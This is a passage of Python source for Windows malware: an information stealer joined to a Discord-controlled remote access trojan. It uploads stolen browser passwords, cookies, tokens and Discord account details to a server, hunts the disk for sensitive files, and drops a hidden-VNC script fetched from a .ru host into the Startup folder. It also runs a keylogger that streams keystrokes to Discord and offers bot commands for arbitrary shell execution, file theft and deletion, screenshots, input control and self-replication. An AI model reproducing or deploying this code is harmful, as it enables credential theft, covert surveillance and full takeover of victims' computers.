            f"LOCATION: {pw['browser']} - {pw['profile']}\n"

            f"URL: {pw['url']}\n"

            f"USERNAME: {pw['username']}\n"

            f"PASSWORD: {pw['password']}"

            for pw in PASSWORDS

        ])

    )

upload_to_server(STORAGE_PATH + "\\Passwords.txt")

for cookie in COOKIES:

    with open(STORAGE_PATH + f"\\Cookies-{cookie['browser']}-{cookie['profile']}.txt", "w", encoding="utf-8") as f:

        f.write(base64.b64decode(cookie["cookies"]).decode())

with open(STORAGE_PATH + "\\GRUPPE_WEB_DATA.txt", "w", encoding="utf-8") as f:

    f.write(
        f"\n{'-' * 50}\n".join([

            f"LOCATION: {w_data['browser']} - {w_data['profile']}\n"

            f"SERVICE: {w_data['service']}\n"

            f"TOKEN: {w_data['token']}\n"
            
            f"{w_data['service'].replace('AccountId-', '')}:{w_data['token']}"

            for w_data in WEB_DATA
        ])

    )


for discord_token in DISCORD_TOKENS:

    with open(STORAGE_PATH + "\\discord-tokens.txt", "w", encoding="utf-8") as f:

        f.write(

            f"\n{'-' * 50}\n".join([

                f"ID: {discord_token['user_id']}\n"

                f"USERNAME: {discord_token['username']}\n"

                f"DISPLAY NAME: {discord_token['display_name']}\n"

                f"EMAIL: {discord_token['email']}\n"

                f"PHONE: {discord_token['phone']}\n"

                f"TOKEN: {discord_token['token']}"

                for discord_token in DISCORD_TOKENS

            ])

        )



for file_to_upload in os.listdir(STORAGE_PATH):

    try:

        upload_to_server(STORAGE_PATH + "\\" + file_to_upload)

    except:

        pass

for path in PATHS_TO_SEARCH:

    for root, _, files in os.walk(path):

        for file_name in files:

            for keyword in FILE_KEYWORDS:

                if keyword in file_name.lower():

                    for extension in ALLOWED_EXTENSIONS:

                        if file_name.endswith(extension):

                            try:

                                upload_to_server(os.path.join(root, file_name))

                            except:

                                pass

try:

    URL = "https://dieserbenni.ru/hvnc.py"

    r = requests.get(URL)

    with open(os.path.join(STARTUP_PATH, "hvnc.py"), "wb") as f:

        f.write(r.content)

except: pass

try:

    os.remove(STORAGE_PATH)

except: pass



class MyView(nextcord.ui.View):
    @nextcord.ui.button(label="Page Up", style=nextcord.ButtonStyle.primary, custom_id="pageup")
    async def page_up_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("pageup")
        await interaction.response.send_message("Page Up has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Page Down", style=nextcord.ButtonStyle.primary, custom_id="pagedown")
    async def page_down_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("pagedown")
        await interaction.response.send_message("Page Down has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="End", style=nextcord.ButtonStyle.primary, custom_id="end")
    async def end_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("end")
        await interaction.response.send_message("End has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Home", style=nextcord.ButtonStyle.primary, custom_id="home")
    async def home_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("home")
        await interaction.response.send_message("Home has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Delete", style=nextcord.ButtonStyle.primary, custom_id="delete")
    async def delete_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("delete")
        await interaction.response.send_message("Delete has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Insert", style=nextcord.ButtonStyle.primary, custom_id="insert")
    async def insert_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("insert")
        await interaction.response.send_message("Insert has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Print Screen", style=nextcord.ButtonStyle.primary, custom_id="printscreen")
    async def print_screen_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("printscreen")
        await interaction.response.send_message("Print Screen has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Caps Lock", style=nextcord.ButtonStyle.primary, custom_id="capslock")
    async def caps_lock_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("capslock")
        await interaction.response.send_message("Caps Lock has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Space", style=nextcord.ButtonStyle.primary, custom_id="space")
    async def space_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("space")
        await interaction.response.send_message("Space has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Alt", style=nextcord.ButtonStyle.primary, custom_id="alt")
    async def alt_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("alt")
        await interaction.response.send_message("Alt has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Ctrl", style=nextcord.ButtonStyle.primary, custom_id="ctrl")
    async def ctrl_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("ctrl")
        await interaction.response.send_message("Ctrl has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Shift", style=nextcord.ButtonStyle.primary, custom_id="shift")
    async def shift_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("shift")
        await interaction.response.send_message("Shift has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Escape", style=nextcord.ButtonStyle.primary, custom_id="esc")
    async def esc_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("esc")
        await interaction.response.send_message("Escape has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Tab", style=nextcord.ButtonStyle.primary, custom_id="tab")
    async def tab_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("tab")
        await interaction.response.send_message("Tab has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Backspace", style=nextcord.ButtonStyle.primary, custom_id="backspace")
    async def backspace_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("backspace")
        await interaction.response.send_message("Backspace has been pressed.", ephemeral=True)

    @nextcord.ui.button(label="Enter/Return", style=nextcord.ButtonStyle.primary, custom_id="enter")
    async def enter_button(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        pyautogui.press("enter")
        await interaction.response.send_message("Enter/Return has been pressed.", ephemeral=True)


# Initialize an empty string to hold the current word
current_word = ""

# Function to send a message to the specified Discord channel
async def send_message(content):
    if keystrokes:  # Use the global keystrokes channel
        await keystrokes.send(content)
    else:
        print("Keystrokes channel is not found!")

def on_key_event(keyboard_event):
    global current_word
    
    # Handle special keys
    if keyboard_event.name in ["space", "enter"]:
        if current_word:
            content = f"{current_word}"
            bot.loop.create_task(send_message(content))
            current_word = ""  # Reset the word
    elif keyboard_event.name == "backspace":
        # Handle backspace: remove the last character from the current word
        current_word = current_word[:-1]
        if current_word == "":
            content = "[backspace]"
        else:
            content = f"{current_word} + [backspace]"
        bot.loop.create_task(send_message(content))
    elif len(keyboard_event.name) == 1:  # Regular single-character keys
        # Add the character to the current word
        current_word += keyboard_event.name
        content = f"{current_word}"
        bot.loop.create_task(send_message(content))
    else:
        # Handle special keys like Shift, Ctrl, etc.
        content = f"[{keyboard_event.name}]"
        bot.loop.create_task(send_message(content))


# Set up the event listener
keyboard.on_press(on_key_event)

# Function to get the names of connected devices
def get_device_names():
    wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    service = wmi.ConnectServer(".", "root\\cimv2")
    devices = service.ExecQuery("Select * from Win32_PnPEntity")

    devicess_names = [device.Name for device in devices if device.Name]
    return devicess_names

# Function to send devices in multiple messages
async def send_devices_in_chunks(channel, device_names, chunk_size=10):
    # Ensure device_names is a list
    if not isinstance(device_names, list):
        raise TypeError("device_names should be a list")

    # Split the list into chunks that fit within Discord's message limit
    for i in range(0, len(device_names), chunk_size):
        chunk = device_names[i:i+chunk_size]
        message = "\n".join(chunk)
        await channel.send(message)

async def send_in_chunks(channel, message: str):
    # Split the message into chunks of 2000 characters or less
    chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
    
    # Send each chunk individually
    for chunk in chunks:
        await channel.send(chunk)

# Function to get information about a specific device
def get_device_info(device_name):
    wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    service = wmi.ConnectServer(".", "root\\cimv2")
    devices = service.ExecQuery("Select * from Win32_PnPEntity")

    for device in devices:
        if device_name.lower() in (device.Name or "").lower():
            return (
                f"**Device Name:** {device.Name}\n"
                f"**Device ID:** {device.DeviceID}\n"
                f"**Description:** {device.Description}\n"
                f"**Manufacturer:** {device.Manufacturer}\n"
                "----------------------------------------"
            )
    return "Device not found."

def list_contents(directory: str, full_path: bool = False) -> dict:
    contents = {'files': [], 'folders': []}
    
    try:
        for entry in Path(directory).iterdir():
            if entry.is_file():
                contents['files'].append(str(entry) if full_path else entry.name)
            elif entry.is_dir():
                contents['folders'].append(str(entry) if full_path else entry.name)
                
    except FileNotFoundError:
        print(f"The directory {directory} does not exist.")
    except PermissionError:
        print(f"Permission denied to access {directory}.")

    return contents

def get_all_drives():
    drives = [f"{d}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
    return drives




@bot.slash_command(name="device_scan", description="List all devices")
async def device_scan(interaction: nextcord.Interaction):
    try:
        device_names = get_device_names()
        if not device_names:
            await interaction.response.send_message("No devices found.")
        else:
            # Send the devices in chunks
            await send_in_chunks(interaction.channel, device_names)
            await interaction.response.send_message("Device list sent in multiple messages.")
    except Exception as e:
        # Handle any errors that occur
        await interaction.response.send_message(f"An error occurred: {e}")


@bot.slash_command(name="device_info", description="Get information about a specific device")
async def device_info(interaction: nextcord.Interaction, device_name: str):
    info = get_device_info(device_name)
    await interaction.response.send_message(info)

@bot.slash_command(name="click", description="Click on The Screen!")
async def click(interaction: nextcord.Interaction):
    x, y = p.position()
    p.click(x, y)
    await interaction.response.send_message("Clicked on the Screen!")

@bot.slash_command(name="scroll", description="Scroll on The Screen!")
async def scroll(interaction: nextcord.Interaction, amount: str):
    p.scroll(amount)
    await interaction.response.send_message("Scrolled on the Screen!")

@bot.slash_command(name="move", description="Move to Anywhere on The Screen!")
async def move(interaction: nextcord.Interaction, x: int, y: int):
    p.moveTo(x, y, duration=0.0)
    await interaction.response.send_message(f"Moved to **{x}**, **{y}**")

@bot.slash_command(name="drag", description="Drag to Anywhere on The Screen!")
async def drag(interaction: nextcord.Interaction, x: int, y: int):
    p.dragTo(x, y, duration=0.0)
    await interaction.response.send_message(f"Dragged to **{x}**, **{y}**")

@bot.slash_command(name="files", description="List the Contents of a directory!")
async def files(interaction: nextcord.Interaction, dir_path: str):
        contents = list_contents(dir_path, full_path=True)
        await interaction.response.send_message(f"Files: {contents['files']} & Folders: {contents['folders']}")

@bot.slash_command(name="upload", description="Upload a file!")
async def upload(interaction: nextcord.Interaction, file_path: str):
    # Get the filename from the path
    filename = os.path.basename(file_path)
    
    try:
        # Defer the response to give the bot more time to process
        await interaction.response.defer()

        # Open the file and create a File object
        with open(file_path, "rb") as file:
            discord_file = nextcord.File(file, filename=filename)
            
            # Send the file in a follow-up message
            await interaction.followup.send(f"Here is your file: {filename}", file=discord_file)
    except FileNotFoundError:
        await interaction.followup.send(f"File not found: {file_path}")
    except NotADirectoryError:
        await interaction.followup.send(f"The path provided is not a directory: {file_path}")
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {e}")

@bot.slash_command(name="delete", description="Delete a file!")
async def delete(interaction: nextcord.Interaction, file_path: str):
        try:
            os.remove(file_path)
            await interaction.response.send_message(f'File "{file_path}" has been deleted.')
        except FileNotFoundError:
            await interaction.response.send_message(f'File not found: "{file_path}"')
        except PermissionError:
            await interaction.response.send_message(f'Permission denied: Unable to delete "{file_path}"')
        except Exception as e:
            await interaction.response.send_message(f"An error occurred: {e}")

@bot.slash_command(name="clone", description="Clone a file!")
async def clone(interaction: nextcord.Interaction, file_path: str, file_name: str, destination: str = nextcord.SlashOption(description="The Destination of the clone file", required=False)):
        
        source_directory = os.path.dirname(file_path)
        if not destination:
            destination = source_directory
        
        try:
            destination = os.path.join(destination, file_name)
            shutil.copy2(file_path, destination)
            await interaction.response.send_message(f'File "{file_path}" has been cloned.')
        except FileNotFoundError:
            await interaction.response.send_message(f'File not found: "{file_path}"')
        except PermissionError:
            await interaction.response.send_message(f'Permission denied: Unable to clone "{file_path}"')
        except Exception as e:
            await interaction.response.send_message(f"An error occurred: {e}")

@bot.slash_command(name="openn", description="Open a file!")
async def openn(interaction: nextcord.Interaction, exe_path: str, times: int = nextcord.SlashOption(description="Amount of time you want to open the file.", required=False)):
        if not times:
            times = 1

        # Defer the response to give the bot more time to process
        await interaction.response.defer()

        for i in range(times):
            try:
                # Open the executable
                subprocess.Popen(f'start "" "{exe_path}"', shell=True)
                await interaction.followup.send(f"{exe_path} has been opened {i+1} times.")

            except FileNotFoundError:
                await interaction.followup.send(f"The executable '{exe_path}' was not found.")
            except Exception as e:
                await interaction.followup.send(f"An error occurred: {e}")

@bot.slash_command(name="power", description="Control the Power of the Pc!")
async def power(interaction: nextcord.Interaction, command: str = nextcord.SlashOption(description="Choose a power option!", choices={"Shutdown": "shutdown", "Restart": "restart", "Sleep": "sleep"})):
     
    if command == "shutdown":
        os.system("shutdown /s /t 1")
        await interaction.response.send_message("Shutting down the Pc.")
    elif command == "restart":
        os.system("shutdown /r /t 1")
        await interaction.response.send_message("Restarting the Pc.")
    elif command == "sleep":
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        await interaction.response.send_message("Putting the pc to sleep.")
    else:
        await interaction.response.send_message("Invalid command. Please enter 'shutdown', 'restart', or 'sleep'.")

@bot.slash_command(name="execute", description="Execute a cmd command!")
async def execute(interaction: nextcord.Interaction, command: str):
    # Defer the response to give the bot more time to process
    await interaction.response.defer()
    try:
        # Run the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Print the output
        await interaction.followup.send(result.stdout)
    except Exception as e:
        if e.code == 50035:
            # Handle the "message too long" error and send in chunks
            await send_in_chunks(interaction.channel, result.stdout)
        else:
            interaction.followup.send(f"Error: {e}")


@bot.slash_command(name="type", description="Type a word!")
async def type(interaction: nextcord.Interaction, word: str):
    pyautogui.write(word)

    # Print the output
    await interaction.response.send_message(f'The string "{word}" has been typed.')

@bot.slash_command(name="special_keys", description="Display buttons for special keys")
async def special_keys(interaction: nextcord.Interaction):
    await interaction.response.send_message("Click a key!", view=MyView())

@bot.slash_command(name="freeze", description="Freeze the Mouse to a certain cordinate")
async def freeze(interaction: nextcord.Interaction, times: int):

    # Defer the response to give the bot more time to process
    await interaction.response.defer()

    x, y = pyautogui.position()
    for i in range(times):
        pyautogui.dragTo(x, y, duration=0.0)
    await interaction.followup.send(f"Freezed {times} times!")

@bot.slash_command(name="window_options", description="Manipulate your window!")
async def window_options(interaction: nextcord.Interaction, application: str, option: str = nextcord.SlashOption(choices={"Focus": 'focus', "Size": 'size', "Position": 'position', "Maximize": 'maximize', "Minimize": 'minimize', "Resize": 'resize', "Move": 'move', "Close": 'close'}), cords: str = nextcord.SlashOption(required=False)):
    
    if not cords:
        cords = "500, 500"
    
    x, y = cords.split(",")
    
    try:
        wm = WindowManager(application)
        if option == "focus":
            wm.focus_window()
            await interaction.response.send_message("Window has been focused.")
        elif option == "size":
            size = wm.get_window_size()
            await interaction.response.send_message(f"Current window size: Width={size.width}, Height={size.height}")
        elif option == "position":
            position = wm.get_window_position()
            await interaction.response.send_message(f"Current window position: X={position.x}, Y={position.y}")
        elif option == "maximize":
            wm.maximize_window()
            await interaction.response.send_message("Window has been maximized.")
        elif option == "minimize":
            wm.minimize_window()
            await interaction.response.send_message("Window has been minimized.")
        elif option == "resize":
            wm.resize_window(x, y)
            await interaction.response.send_message("Window has been resized.")
        elif option == "move":
            wm.move_window(x, y)
            await interaction.response.send_message("Window has been moved.")
        elif option == "close":
            wm.close_window()
            await interaction.response.send_message("Window has been closed.")
    except Exception as e:
        await interaction.response.send_message(f"Error Occured: {e}")

@bot.slash_command(name="open_apps", description="Lists the names of currently open apps.")
async def open_apps(interaction: nextcord.Interaction):
    # Get a list of all currently running processes
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'status']):
        # Filter out system/background processes (status != 'running')
        if proc.info['status'] == psutil.STATUS_RUNNING:
            processes.append(proc.info['name'])
    
    if processes:
        # Join the list into a string and send it as a response
        process_list = "\n".join(processes)
        await send_in_chunks(interaction.channel, f"Currently opened apps:\n{process_list}")
    else:
        await interaction.response.send_message("No apps are currently open.")

@bot.slash_command(name="screenshot", description="Take a screenshot and upload it")
async def screenshot(interaction: nextcord.Interaction):
    await interaction.response.defer()  # Defer the response if it takes time

    # Take the screenshot and save it in the current directory
    screenshot_path = screenshot_taker.take_screenshot()
    try:

        if screenshot_path and os.path.exists(screenshot_path):
            filename = os.path.basename(screenshot_path)
            with open(screenshot_path, "rb") as file:
                discord_file = nextcord.File(file, filename=filename)
                
                # Send the file in a follow-up message
                await interaction.followup.send(f"Here is your screenshot: {filename}", file=discord_file)
        else:
            await interaction.followup.send("Failed to take a screenshot.")

    except Exception as e:
        await interaction.followup.send(f"Error: {e}")

    # Optionally, delete the screenshot after sending it
        shutil.rmtree(screenshot_path)
        await logs.send(f"Deleted {screenshot_path}")

@bot.slash_command(name="random_path", description="Give a random Directory!")
async def random_path(interaction: nextcord.Interaction, dir: str):
    await interaction.response.defer()  # Defer the response if it takes time

    base_path = dir.strip()
    try:
        random_subdir = get_random_subdirectory(base_path)
        await interaction.followup.send(f"Random subdirectory: {random_subdir}")
    except NotADirectoryError as e:
        await interaction.followup.send(e)
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {e}")

@bot.slash_command(name="clone_current", description="Clone Current Script!")
async def clone_current(interaction: nextcord.Interaction, directory: str):
    await interaction.response.defer()
    copy_current_script(directory)
    with open(destination_path, 'r') as file:
        code = file.read()
        exec(code)
    await interaction.followup.send(f"Program Cloned to '{destination_path}'!", )

# Replace 'your_token_here' with your bot's token
bot.run(TOKEN)
"))
